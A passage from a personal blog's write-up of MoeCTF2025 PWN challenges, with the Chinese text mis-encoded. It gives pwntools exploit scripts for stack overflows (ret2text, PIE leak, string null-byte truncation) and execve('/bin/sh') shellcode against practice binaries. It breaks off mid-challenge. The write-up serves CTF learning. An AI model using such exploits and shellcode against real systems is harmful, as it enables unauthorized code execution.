<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Sadsnowcat">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes ASAP (before DOMContentLoaded)
            (function() {
                const addBodyClass = () => {
                    const b = document.body;
                    if (!b) return false;
                    b.classList.add(theme + "-mode");
                    return true;
                };

                // Try immediately
                if (addBodyClass()) return;

                // Observe until body exists
                const mo = new MutationObserver(() => {
                    if (addBodyClass()) mo.disconnect();
                });
                mo.observe(document.documentElement, { childList: true, subtree: true });
            })();
        })();
    </script>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2026/01/26/moectf2025/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Sadsnowcat&#39;s blog, a PWN learner">
<meta property="og:type" content="article">
<meta property="og:title" content="MoeCTF2025(PWN)éå®˜æ–¹ä¸ªäººé¢˜è§£">
<meta property="og:url" content="http://example.com/2026/01/26/moectf2025/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Sadsnowcat&#39;s blog, a PWN learner">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/redefine-og.webp">
<meta property="article:published_time" content="2026-01-26T04:00:00.000Z">
<meta property="article:modified_time" content="2026-02-11T08:30:23.175Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.png">
    <!--- Page Info-->
    
    <title>
        
            MoeCTF2025(PWN)éå®˜æ–¹ä¸ªäººé¢˜è§£ | Snowcat&#39;s blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    
        
            
    
            
    
            
                
                    <style>
  [data-theme='dark'] body {
    background-color:
    background-image: url("/images/your-dark-bg.webp") !important;
  }
  [data-theme='light'] body {
    background-color:
    background-image: url("/images/wallhaven-wqery6-light.webp") !important;
  }
</style>

                
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"auto"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false,"enable":true},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Sadsnowcat's blog, a PWN learner"},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background-light.jpg","dark":"/images/background-dark.jpg"},"title":"Snowcat","subtitle":{"text":["Documenting My PWN Learning Journey","Maybe every day will be better"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/sadsnowcat/","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Friends":{"path":"/links/","icon":"fa-regular fa-link"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null,"categories":{"enable":true,"limit":5}},"article_date_format":"auto","excerpt_length":100,"categories":{"enable":true,"limit":null},"tags":{"enable":true,"limit":3}},"footerStart":"2026/1/16 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Snowcat&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/links/"
                                        >
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    FRIENDS
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags"
                                        >
                                    <i class="fa-regular fa-tags fa-fw"></i>
                                    TAGS
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/links/"
                        >
                            <span>
                                FRIENDS
                            </span>
                            
                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags"
                        >
                            <span>
                                TAGS
                            </span>
                            
                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">MoeCTF2025(PWN)éå®˜æ–¹ä¸ªäººé¢˜è§£</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/sadsnowcat.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">Sadsnowcat</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2026-01-26 12:00</span>
        <span class="mobile">2026-01-26 12:00</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2026-02-11 16:30:23</span>
            <span class="mobile">2026-02-11 16:30:23</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/CTF%E9%A2%98%E8%A7%A3/">CTFé¢˜è§£</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Writeup/">Writeup</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/PWN/">PWN</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>MoeCTF2025çš„PWNä¸ªäººå‘é¢˜è§£ï¼Œç¬”è€…æ ¹æ®éš¾æ˜“é€‚å½“è¿›è¡Œäº†æ’åºï¼Œæ¬¢è¿å¤§å®¶å‚è€ƒäº¤æµã€‚</p>
<h2 id="EZtext"><a href="#EZtext" class="headerlink" title="EZtext"></a>EZtext</h2><p>ç®€å•çš„ret2textï¼Œè¦†ç›–bufã€<code>rbp</code>ï¼Œæ ˆå¯¹é½ï¼Œåé—¨å‡½æ•°</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.30.48.1&quot;</span>,<span class="number">58296</span>)</span><br><span class="line">treasure = <span class="number">0x4011B6</span></span><br><span class="line">ret_addr = <span class="number">0x40122D</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span> + p64(ret_addr) + p64(treasure)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;stack?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">50</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>ç®€å•çš„shellcode<br>ä¸€ä¸ªæ±‡ç¼–ç è½¬æœºå™¨ç çš„ç½‘ç«™<a class="link"   target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm" >Online x86 and x64 Intel Instruction Assembler<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;permissions you just set.&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line"><span class="comment"># &quot;\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5F\x31\xF6\x31\xD2\x6A\x3B\x58\x0F\x05&quot;</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="è®¤è¯†libc"><a href="#è®¤è¯†libc" class="headerlink" title="è®¤è¯†libc"></a>è®¤è¯†libc</h2><p>ä¸€ä¸ªlibcæ¿å­<br>è§<a href="#ezlibc">ezlibc</a></p>
<h2 id="str-check"><a href="#str-check" class="headerlink" title="str_check"></a>str_check</h2><blockquote>
<p>ç›¸ä¿¡ä½ å·²ç»åœ¨æŒ‡åŒ—ä¸­äº†è§£åˆ°cé£æ ¼å­—ç¬¦ä¸²ä»¥â€™\0â€™ç»“å°¾çš„ç‰¹ç‚¹ã€‚å­¦ä¹ å„ç§å­—ç¬¦ä¸²æ“ä½œå¯¹â€™\0â€™çš„å¤„ç†ï¼Œä½ æ‰èƒ½å®Œç¾åœ°åˆ©ç”¨ç¨‹åºä¸­çš„æ¼æ´ã€‚</p>
</blockquote>
<p>ä½¿ç”¨\x00æˆªæ–­å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²å‰4æ˜¯moewï¼Œret2text<br><code>ljust</code>åŸæ•°æ®é å·¦ ï¼Œ<code>rjust</code>åŸæ•°æ®é å³ï¼Œéƒ½ç”¨æ¥å¡«å……å­—èŠ‚ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">53500</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor=<span class="number">0x40123b</span></span><br><span class="line">payload=<span class="string">b&#x27;moew\x00&#x27;</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(backdoor)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;say?&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="xdulake"><a href="#xdulake" class="headerlink" title="xdulake"></a>xdulake</h2><blockquote>
<p>æ€ä¹ˆæœ‰ä¸ªå¤§ä¸€æ–°ç”Ÿèµ°åˆ°æ¹–é‡Œäº†ï¼Ÿ<br>æ ˆä¸Šçš„æ•°æ®ä¸ä¼šæ— ç¼˜æ— æ•…åœ°è¢«æ¸…ç†ï¼Œä½ èƒ½æ ¹æ®è¿™ä¸ªä¿¡æ¯æ‹¯æ•‘&#x2F;æˆä¸ºlakerå—ï¼Ÿ</p>
</blockquote>
<p>æ³¨æ„åˆ°æœ‰åé—¨å‡½æ•°ã€‚pull()ä¸­æ³„éœ²PIEåŸºå€ï¼Œphoto()å¯ä»¥è¯»64ä¸ªå­—èŠ‚ï¼Œlaker()å°†<code>s1</code>ä¸<code>&quot;xdulaker&quot;</code>æ¯”è¾ƒï¼Œç›¸åŒåˆ™é€šè¿‡ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">photo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">...</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">laker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, <span class="string">&quot;xdulaker&quot;</span>, <span class="number">8uLL</span>) )</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>photo()ç”³è¯·äº†<code>0x50</code>çš„æ ˆç©ºé—´ï¼Œ<code>rbp-50h</code>,å†™å…¥äº†<code>0x40</code>å­—èŠ‚çš„æ•°æ®ã€‚laker()ä¸­<code>s1</code>ä»<code>rbp-30h</code>å¼€å§‹æ¯”è¾ƒï¼Œè¿™é‡Œç®€å•éªŒè¯ä¸€ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hey,what&#x27;s your name?!</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxdulaker</span><br><span class="line">I will teach you a lesson.</span><br><span class="line">&gt;3</span><br><span class="line">welcome,xdulaker</span><br></pre></td></tr></table></figure></div>
<p>é€šè¿‡éªŒè¯ï¼Œæ¥ä¸‹æ¥æ˜¯ç†Ÿæ‚‰çš„ret2textäº†ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.50.1&#x27;</span>,<span class="number">59868</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;gift:&#x27;</span>)</span><br><span class="line">leak_opt = <span class="built_in">int</span>((p.recv(<span class="number">14</span>)),<span class="number">16</span>)</span><br><span class="line">pie_base=leak_opt - <span class="number">0x4010</span></span><br><span class="line">bkd=pie_base+<span class="number">0x124E</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">b&#x27;xdulaker&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;your name?!\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">b&#x27;SNOWCATT&#x27;</span> + p64(bkd)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><blockquote>
<p>ä½ å¯ä»¥è½»æ˜“çˆ†ç ´æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œä½†æ˜¯ä¸€ä¸ªä¸å¯æ³„éœ²çš„â€œcanaryâ€ä½ åˆè¯¥å¦‚ä½•åº”å¯¹ï¼Ÿ</p>
</blockquote>
<p>äººå·¥canaryï¼Œæä¾›äº†winå‡½æ•°ï¼Œæç¤ºå¯ä»¥ä½¿ç”¨pythonçš„ctypesåŒ…<br>ctypeså¯ä»¥è°ƒç”¨Cåº“å‡½æ•°ï¼Œäºæ˜¯ä½¿ç”¨ctypesåŠ è½½libc<br>init()ä¸­æœ‰<code>v0 = time(0LL)</code>ï¼Œä½¿time&#x3D;0ï¼Œ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">124</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line"><span class="type">int</span> v5; <span class="comment">// [rsp+7Ch] [rbp-14h]</span></span><br><span class="line"><span class="type">int</span> v6; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br></pre></td></tr></table></figure></div>
<p>å…ˆå¡«å……0x90-0x14ï¼Œå†å¡«å……canaryï¼Œå†å¡«å……16+8</p>
